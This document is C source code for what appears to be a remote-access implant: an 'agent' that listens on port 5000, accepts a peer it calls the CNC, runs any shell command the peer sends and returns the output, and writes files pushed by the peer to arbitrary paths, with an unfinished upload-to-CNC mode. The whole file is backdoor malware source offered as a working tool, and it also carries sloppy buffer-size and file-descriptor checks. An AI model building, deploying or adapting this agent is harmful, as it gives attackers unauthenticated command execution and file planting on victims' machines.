#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>

#include "shell.h"

#define PORT 5000
#define CMD_TYPE_BUFSIZE 0x4

enum CommandType
{
    SHELL = 0x0,
    DOWNLOAD_FILE_FROM_CNC = 0x1,
    UPLOAD_FILE_TO_CNC = 0x2
};

int start_server()
{
    int server_fd;
    struct sockaddr_in address = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = INADDR_ANY,
        .sin_port = htons(PORT)};

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
    {
        perror("Failed to create a socket.");
        exit(EXIT_FAILURE);
    }

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0)
    {
        perror("Failed to bind a socket.");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 3) < 0)
    {
        perror("Failed to listen on the socket.");
        exit(EXIT_FAILURE);
    }
    return server_fd;
}

void start_agent()
{
    char local_path[255];
    char pending_buf[2048];
    uint64_t remaining_bufsize, bytes_read;
    char output[SHELL_OUTPUT_BUFSIZE];
    char cmd[SHELL_CMD_BUFSIZE];
    unsigned int cnc_file_fd, peer_fd, cmd_type, server_fd = start_server();

    puts("Starting the agent.");
    puts("Accepting a peer.");
    if ((peer_fd = accept(server_fd, (struct sockaddr *)NULL, NULL)) < 0)
    {
        perror("Failed to accept the peer.");
        exit(EXIT_FAILURE);
    }
    while (1)
    {
        cmd_type = 0;
        remaining_bufsize = 0;
        memset(local_path, 0, sizeof(output));
        memset(output, 0, sizeof(output));
        memset(cmd, 0, sizeof(output));
        puts("Waiting for command from peer.");
        if (read(peer_fd, &cmd_type, sizeof(cmd_type)) < 0)
        {
            perror("Failed to read command from the peer.");
            exit(EXIT_FAILURE);
        }
        switch (cmd_type)
        {
        case SHELL:
            puts("Command type is SHELL.");
            if (read(peer_fd, cmd, sizeof(cmd)) < 0)
            {
                perror("Failed to read the shell command from peer.");
                exit(EXIT_FAILURE);
            }
            shell(cmd, output);
            puts("Sending the command output to the peer.");
            if (write(peer_fd, output, sizeof(output)) < 0)
            {
                perror("Failed to send output to the peer.");
                exit(EXIT_FAILURE);
            }
            break;
        case DOWNLOAD_FILE_FROM_CNC:
            puts("Command type is DOWNLOAD_FILE_FROM_CNC.");
            if (read(peer_fd, local_path, sizeof(local_path)) < 0)
            {
                perror("Failed to read data from the peer.");
                exit(EXIT_FAILURE);
            }
            printf("local path: %s\n", local_path);
            if (read(peer_fd, &remaining_bufsize, sizeof(remaining_bufsize)) < 0)
            {
                perror("Failed to read data from the peer.");
                exit(EXIT_FAILURE);
            }
            printf("file_size: %lx\n", remaining_bufsize);

            if ((cnc_file_fd = open(local_path, O_CREAT | O_WRONLY, 0644)) < 0)
            {
                perror("Failed to open the requested file.");
                exit(EXIT_FAILURE);
            }
            while (remaining_bufsize != 0)
            {
                if ((bytes_read = read(peer_fd, pending_buf, sizeof(pending_buf))) < 0)
                {
                    perror("Failed to read data from the peer.");
                    exit(EXIT_FAILURE);
                }
                if (write(cnc_file_fd, pending_buf, bytes_read) < 0)
                {
                    perror("Failed to write data to the file.");
                    exit(EXIT_FAILURE);
                }
                remaining_bufsize -= bytes_read;
            }
            close(cnc_file_fd);
            break;
        default:
            puts("Unknown command type.");
        }
    }
    close(peer_fd);
}